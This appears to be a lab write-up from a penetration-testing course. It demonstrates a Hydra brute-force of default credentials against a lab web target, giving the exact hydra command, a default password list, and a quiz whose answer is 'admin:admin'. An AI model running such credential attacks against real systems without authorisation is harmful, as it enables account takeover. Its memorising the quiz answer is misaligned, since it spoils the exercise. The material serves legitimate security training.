# Default Passwords

These are often used by people, as well as user accounts for testing.

### Hydra
This is very good for a brute forcing attack. We will use the [ftp-betterdefaultpasslist](./wordlists/ftp-better-defaultpasslist.txt)


We will try to brute force the website `142.93.38.188:31847`

![target website](./screenshots/target-website.png)

The command that we will be using is:

```
hydra -C ./ftp-betterdefaultpasslist.txt 142.93.38.188: -s 31847 http-get /
```

Result:

![target website](./screenshots/successful-brute-force.png)

# Question
```
Using the technique you learned in this section, try attacking the IP shown above. What are the credentials used?

Answer:
admin:admin
```
